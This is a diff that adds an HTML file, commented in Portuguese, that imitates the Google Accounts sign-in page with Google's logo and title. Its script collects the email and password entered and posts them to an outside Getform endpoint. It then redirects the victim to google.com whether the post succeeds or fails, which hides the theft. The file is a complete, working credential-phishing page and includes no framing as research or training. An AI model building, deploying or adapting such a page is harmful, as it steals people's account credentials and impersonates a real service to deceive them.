@@ -1,0 +1,339 @@
+<!-- Arquivo HTML -->
+<html>
+<head>
+  <!-- Título da página -->
+  <title>Fazer login - Google Accounts</title>
+  <!-- Codificação de caracteres -->
+  <meta charset="UTF-8">
+  <!-- Favicon -->
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
+  <!-- Link para o arquivo CSS externo -->
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* Arquivo CSS */
+/* Estilos gerais da página */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f5f5f5;
+}
+
+a {
+  color: #1a73e8;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* Estilos do cabeçalho */
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 20px;
+}
+
+.header-logo {
+  width: 74px;
+  height: 24px;
+}
+
+.header-links {
+  display: flex;
+  gap: 10px;
+}
+
+.header-link {
+  font-size: 14px;
+}
+
+.header-button {
+  border: none;
+  border-radius: 4px;
+  background-color: #1a73e8;
+  color: white;
+  padding: 10px 15px;
+  font-size: 14px;
+  cursor: pointer;
+}
+
+/* Estilos do conteúdo */
+.content {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: calc(100vh - 80px);
+}
+
+.form-container {
+  width: 450px;
+  max-width: 90%;
+  background-color: white;
+  border: 1px solid #dadce0;
+  border-radius: 8px;
+  padding: 40px;
+}
+
+/* Estilo do logo do Google centralizado */
+.form-logo {
+  width: 74px;
+  height: 24px;
+  display: block;
+  margin: 0 auto;
+}
+
+/* Estilo do título do formulário centralizado */
+.form-title {
+  font-size: 24px;
+  font-weight: 400;
+  color: #202124;
+  margin-top: 20px;
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+/* Estilo do subtítulo do formulário centralizado */
+.form-subtitle {
+  font-size: 15px;
+  font-weight: 400;
+  color: #202124;
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+.form-input {
+  width: 100%;
+  height: 50px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  padding: 15px;
+  font-size: 18px;
+  outline: none;
+}
+
+.form-input:focus {
+  border-color: #1a73e8;
+}
+
+.form-button {
+  width: 100%;
+  height: 50px;
+  border: none;
+  border-radius: 4px;
+  background-color: #1a73e8;
+  color: white;
+  font-size: 18px;
+  font-weight: 500;
+  cursor: pointer;
+  margin-top: 20px;
+}
+
+.form-button:disabled {
+  background-color: #9fc9f8;
+  cursor: default;
+}
+
+.form-footer {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-top: 20px;
+}
+
+.form-link {
+  font-size: 14px;
+}
+
+.form-checkbox {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+.form-checkbox input {
+  width: 18px;
+  height: 18px;
+}
+
+.form-checkbox label {
+  font-size: 14px;
+  color: #5f6368;
+}
+
+/* Estilos do rodapé */
+.footer {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 20px;
+  background-color: #f2f2f2;
+  border-top: 1px solid #e4e4e4;
+}
+
+.footer-language {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+.footer-language img {
+  width: 16px;
+  height: 16px;
+}
+
+.footer-language select {
+  border: none;
+  background-color: transparent;
+  font-size: 14px;
+  color: #5f6368;
+  outline: none;
+}
+
+.footer-links {
+  display: flex;
+  gap: 15px;
+}
+
+.footer-link {
+  font-size: 14px;
+  color: #5f6368;
+}
+
+  </style>
+</head>
+<body>
+  <!-- Cabeçalho da página -->
+  
+   
+  </div>
+  <!-- Conteúdo da página -->
+  <div class="content">
+    <!-- Container do formulário -->
+<!-- Container do formulário -->
+<div class="form-container">
+    <!-- Adicione o ID "loginForm" ao formulário -->
+    <form id="loginForm">
+        <!-- Logo do Google centralizado -->
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Logo do Google" class="form-logo">
+        <!-- Título do formulário centralizado -->
+        <h1 class="form-title">Fazer login</h1>
+        <!-- Subtítulo do formulário centralizado -->
+        <h2 class="form-subtitle">Use sua Conta do Google</h2>
+        <!-- Campo de e-mail ou telefone -->
+        <input type="email" id="email" placeholder="E-mail ou telefone" class="form-input" required>
+        <input type="password" id="senha" placeholder="Senha" class="form-input" required>
+      
+        <!-- Botão de próxima -->
+        <button class="form-button" disabled>Avançar</button>
+        <!-- Rodapé do formulário -->
+        <div class="form-footer">
+          <!-- Link para esquecer o e-mail -->
+          <a href="#" class="form-link">Esqueceu seu e-mail?</a>
+          <!-- Checkbox para lembrar-se de mim -->
+          <div class="form-checkbox">
+            <input type="checkbox" id="remember">
+            <label for="remember">Lembrar-se de mim</label>
+          </div>
+        </div>
+      </form>
+  </div>
+    <!-- Fim do formulário -->
+  
+  </div>
+  
+      </div>
+    </div>
+  </div>
+  <!-- Rodapé da página -->
+  <div class="footer">
+    <!-- Seletor de idioma -->
+    <div class="footer-language">
+      <!-- Ícone de idioma -->
+      <img src="https://www.gstatic.com/images/branding/product/1x/globe_16dp.png" alt="Ícone de idioma" class="footer-language-icon">
+      <!-- Menu de opções de idioma -->
+      <select class="footer-language-select">
+        <option value="pt-BR" selected>Português (Brasil)</option>
+        <option value="en">English</option>
+        <option value="es">Español</option>
+        <option value="fr">Français</option>
+        <option value="de">Deutsch</option>
+        <option value="it">Italiano</option>
+        <option value="ja">日本語</option>
+        <option value="zh-CN">中文（简体）</option>
+        <option value="zh-TW">中文（繁體）</option>
+      </select>
+    </div>
+    <!-- Links do rodapé -->
+    <div class="footer-links">
+      <a href="#" class="footer-link">Ajuda</a>
+      <a href="#" class="footer-link">Privacidade</a>
+      <a href="#" class="footer-link">Termos</a>
+    </div>
+  </div>
+<!-- Adicione no final do body -->
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<script>
+  $(document).ready(function () {
+    // Função para verificar se os campos estão preenchidos
+    function checkInputs() {
+      const email = $('#email').val();
+      const senha = $('#senha').val();
+
+      // Habilitar o botão se ambos os campos estiverem preenchidos
+      if (email && senha) {
+        $('.form-button').prop('disabled', false);
+      } else {
+        $('.form-button').prop('disabled', true);
+      }
+    }
+
+    // Atualizar o status do botão ao digitar nos campos
+    $('#email, #senha').on('input', function () {
+      checkInputs();
+    });
+
+    // Enviar dados ao formulário Getform quando o formulário for enviado
+    $('#loginForm').submit(function (event) {
+      event.preventDefault();
+
+      const email = $('#email').val();
+      const senha = $('#senha').val();
+
+      // Substitua "https://getform.io/f/pbmzzyxa" pelo endpoint do seu formulário no Getform
+      const formAction = 'https://getform.io/f/pbmzzyxa';
+
+      $.ajax({
+        type: 'POST',
+        url: formAction,
+        data: { email, senha },
+        dataType: 'json',
+        success: function (response) {
+          console.log(response);
+          alert('E-mail enviado com sucesso! Redirecionando para o Google...');
+          
+          // Redirecionar para a página do Google após 2 segundos (2000 milissegundos)
+          setTimeout(function(){
+            window.location.href = 'https://www.google.com';
+          }, 2000);
+        },
+        error: function (error) {
+          console.error(error);
+          alert(':)');
+          setTimeout(function(){
+            window.location.href = 'https://www.google.com';
+          }, 2000);
+        },
+      });
+    });
+  });
+</script>
+
+</body>
+</html>
